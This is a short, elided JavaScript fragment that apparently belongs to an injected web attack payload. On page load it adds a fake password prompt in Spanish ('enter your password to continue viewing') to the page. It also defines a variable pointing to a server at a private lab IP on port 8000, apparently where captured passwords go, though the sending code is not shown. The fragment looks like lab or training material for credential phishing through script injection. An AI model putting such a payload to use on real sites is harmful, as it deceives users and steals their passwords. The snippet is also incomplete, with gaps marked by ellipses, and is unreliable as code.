document.addEventListener('DOMContentLoaded', (e) => { 
    ...
    <div class="mb-3">
    <label for="password" class="form-label">Escriba su contraseña para continuar viendo</label> <input type="password" class="form-control" id="password">
    </div>
`;
...
document.body.insertAdjacentHTML('beforeend', menu); 
    ...
    var count = 0;
    var iplinux = 'http://192.168.56.3:8000/';
